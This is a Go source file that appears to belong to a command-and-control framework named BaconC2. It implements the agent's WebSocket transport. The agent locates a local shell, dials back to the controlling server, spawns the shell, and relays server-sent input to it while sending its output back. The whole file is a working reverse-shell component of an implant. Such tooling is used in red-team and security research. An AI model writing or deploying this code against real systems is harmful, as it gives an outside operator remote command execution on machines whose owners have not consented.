package transport

import (
	"bufio"
	"bytes"
	"context"
	"errors"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/RabbITCybErSeC/BaconC2/client/models"
	"github.com/gorilla/websocket"
)

type WebSocketTransportProvider interface {
	GetServerURL() string
	GetAgentID() string
	NewWebSocketTransport(serverURL, agentID string) models.IStreamingTransport
}

const (
	wsShellPath       = "%s/ws/api/agents/shell?id=%s"
	defaultBufferSize = 1024
	defaultTerm       = "xterm"
	dialTimeout       = 10 * time.Second
)

type WebSocketTransport struct {
	serverURL string
	agentID   string
	conn      *websocket.Conn
	ctx       context.Context
	cancel    context.CancelFunc
	mutex     sync.Mutex
	shells    []string
}

func NewWebSocketTransport(serverURL, agentID string) models.IStreamingTransport {
	ctx, cancel := context.WithCancel(context.Background())
	t := &WebSocketTransport{
		serverURL: serverURL,
		agentID:   agentID,
		ctx:       ctx,
		cancel:    cancel,
	}
	t.initShells()
	return t
}

func (t *WebSocketTransport) initShells() {
	t.mutex.Lock()
	defer t.mutex.Unlock()
	if len(t.shells) > 0 {
		return
	}

	goodShells := []string{"zsh", "bash", "fish", "sh"}
	potentialShells := []string{}

	// Try known good shells
	for _, shell := range goodShells {
		if path, err := exec.LookPath(shell); err == nil {
			potentialShells = append(potentialShells, filepath.Clean(path))
		}
	}

	// Fallback to /etc/shells if none found
	if len(potentialShells) == 0 {
		if shells, err := getSystemShells(); err == nil {
			potentialShells = append(potentialShells, shells...)
		}
	}

	// Validate shells
	for _, s := range potentialShells {
		if info, err := os.Stat(s); err == nil && !info.IsDir() && info.Mode()&0111 != 0 {
			t.shells = append(t.shells, s)
		}
	}

	if len(t.shells) == 0 {
		log.Printf("Warning: No valid shells found")
	} else {
		log.Printf("Found shells: %v", t.shells)
	}
}

// getSystemShells reads /etc/shells to find valid system shells.
func getSystemShells() ([]string, error) {
	file, err := os.Open("/etc/shells")
	if err != nil {
		return nil, fmt.Errorf("failed to open /etc/shells: %w", err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	potentialShells := []string{}
	goodShells := map[string]bool{"zsh": true, "bash": true, "fish": true, "sh": true}

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if len(line) == 0 || line[0] == '#' {
			continue
		}
		if goodShells[filepath.Base(line)] {
			potentialShells = append(potentialShells, filepath.Clean(line))
		}
	}

	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("error reading /etc/shells: %w", err)
	}
	return potentialShells, nil
}

// StartStreamingSession initiates a WebSocket-based shell session.
func (t *WebSocketTransport) StartStreamingSession(sessionType string, config models.StreamingConfig, resultChan chan<- models.CommandResult) error {
	if sessionType != "shell" {
		err := fmt.Errorf("unsupported session type: %s", sessionType)
		resultChan <- models.CommandResult{
			ID:     "session_start",
			Status: "error",
			Output: map[string]string{"error": err.Error()},
		}
		return err
	}

	if config.ShellType == models.ShellTypeUnknown {
		err := fmt.Errorf("invalid shell type: %s", config.ShellType)
		resultChan <- models.CommandResult{
			ID:     "session_start",
			Status: "error",
			Output: map[string]string{"error": err.Error()},
		}
		return err
	}

	wsURL := fmt.Sprintf(wsShellPath, t.serverURL, t.agentID)
	dialer := websocket.Dialer{
		HandshakeTimeout: dialTimeout,
	}
	conn, _, err := dialer.Dial(wsURL, nil)
	if err != nil {
		resultChan <- models.CommandResult{
			ID:     "session_start",
			Status: "error",
			Output: map[string]string{"error": fmt.Sprintf("failed to connect to WebSocket: %v", err)},
		}
		return fmt.Errorf("failed to dial WebSocket: %w", err)
	}

	t.mutex.Lock()
	if t.conn != nil {
		t.conn.Close()
	}
	t.conn = conn
	t.mutex.Unlock()

	cmd, err := t.startShellProcess(config.ShellType, config)
	if err != nil {
		t.CloseSession("shell")
		resultChan <- models.CommandResult{
			ID:     "session_start",
			Status: "error",
			Output: map[string]string{"error": fmt.Sprintf("failed to start shell: %v", err)},
		}
		return fmt.Errorf("failed to start shell: %w", err)
	}

	errChan := make(chan error, 1)
	go t.handleShellSession(cmd, resultChan, errChan)

	// Monitor errors from goroutine
	go func() {
		if err := <-errChan; err != nil {
			resultChan <- models.CommandResult{
				ID:     "session_start",
				Status: "error",
				Output: map[string]string{"error": fmt.Sprintf("shell session error: %v", err)},
			}
			t.CloseSession("shell")
		}
	}()

	resultChan <- models.CommandResult{
		ID:     "session_start",
		Status: "success",
		Output: map[string]string{"message": "Shell session started"},
	}
	return nil
}

// startShellProcess spawns a shell process based on the provided shell type.
func (t *WebSocketTransport) startShellProcess(shellType models.ShellType, config models.StreamingConfig) (*exec.Cmd, error) {
	shellPath := ""
	for _, shell := range t.shells {
		base := filepath.Base(filepath.Clean(shell))
		switch shellType {
		case models.ShellTypeBash:
			if base == "bash" {
				shellPath = shell
			}
		case models.ShellTypeSh:
			if base == "sh" {
				shellPath = shell
			}
		case models.ShellTypeZsh:
			if base == "zsh" {
				shellPath = shell
			}
		case models.ShellTypeFish:
			if base == "fish" {
				shellPath = shell
			}
		}
		if shellPath != "" {
			break
		}
	}

	if shellPath == "" {
		return nil, fmt.Errorf("no suitable shell found for type: %s", shellType)
	}

	term := config.Term
	if term == "" {
		term = defaultTerm
	}

	cmd := exec.CommandContext(t.ctx, shellPath)
	cmd.Env = append(os.Environ(), "TERM="+term)
	return cmd, nil
}

// handleShellSession manages the shell process and WebSocket communication.
func (t *WebSocketTransport) handleShellSession(cmd *exec.Cmd, resultChan chan<- models.CommandResult, errChan chan<- error) {
	defer t.CloseSession("shell")
	defer func() {
		if err := cmd.Process.Kill(); err != nil && !errors.Is(err, os.ErrProcessDone) {
			log.Printf("Failed to kill shell process: %v", err)
		}
		if err := cmd.Wait(); err != nil && !errors.Is(err, os.ErrProcessDone) {
			log.Printf("Shell process wait error: %v", err)
		}
	}()

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		errChan <- fmt.Errorf("failed to get stdout pipe: %w", err)
		return
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		errChan <- fmt.Errorf("failed to get stderr pipe: %w", err)
		return
	}
	stdin, err := cmd.StdinPipe()
	if err != nil {
		errChan <- fmt.Errorf("failed to get stdin pipe: %w", err)
		return
	}

	if err := cmd.Start(); err != nil {
		errChan <- fmt.Errorf("failed to start shell process: %w", err)
		return
	}

	var wg sync.WaitGroup
	wg.Add(2)

	// Read stdout
	go func() {
		defer wg.Done()
		buf := bytes.NewBuffer(nil)
		if _, err := io.Copy(buf, stdout); err != nil && !errors.Is(err, io.EOF) {
			errChan <- fmt.Errorf("error reading stdout: %w", err)
			return
		}
		if buf.Len() > 0 {
			if err := t.sendMessage(models.WebSocketMessage{
				Type: "output",
				Data: buf.String(),
			}); err != nil {
				errChan <- fmt.Errorf("failed to send stdout: %w", err)
			}
		}
	}()

	// Read stderr
	go func() {
		defer wg.Done()
		buf := bytes.NewBuffer(nil)
		if _, err := io.Copy(buf, stderr); err != nil && !errors.Is(err, io.EOF) {
			errChan <- fmt.Errorf("error reading stderr: %w", err)
			return
		}
		if buf.Len() > 0 {
			if err := t.sendMessage(models.WebSocketMessage{
				Type: "error",
				Data: buf.String(),
			}); err != nil {
				errChan <- fmt.Errorf("failed to send stderr: %w", err)
			}
		}
	}()

	// Handle WebSocket input
	for {
		select {
		case <-t.ctx.Done():
			wg.Wait()
			return
		default:
			var msg models.WebSocketMessage
			t.mutex.Lock()
			if t.conn == nil {
				t.mutex.Unlock()
				wg.Wait()
				return
			}
			err := t.conn.ReadJSON(&msg)
			t.mutex.Unlock()
			if err != nil {
				errChan <- fmt.Errorf("WebSocket read error: %w", err)
				wg.Wait()
				return
			}
			if msg.Type == "input" {
				if _, err := stdin.Write([]byte(msg.Data)); err != nil {
					errChan <- fmt.Errorf("error writing to shell stdin: %w", err)
					wg.Wait()
					return
				}
			} else if msg.Type == "control" && msg.Data == "terminate" {
				wg.Wait()
				return
			}
		}
	}
}

func (t *WebSocketTransport) sendMessage(msg models.WebSocketMessage) error {
	t.mutex.Lock()
	defer t.mutex.Unlock()
	if t.conn == nil {
		return fmt.Errorf("no WebSocket connection")
	}
	return t.conn.WriteJSON(msg)
}

func (t *WebSocketTransport) CloseSession(sessionID string) error {
	t.mutex.Lock()
	defer t.mutex.Unlock()

	t.cancel()

	if t.conn != nil {
		err := t.conn.Close()
		t.conn = nil
		if err != nil {
			return fmt.Errorf("failed to close WebSocket connection: %w", err)
		}
	}
	return nil
}
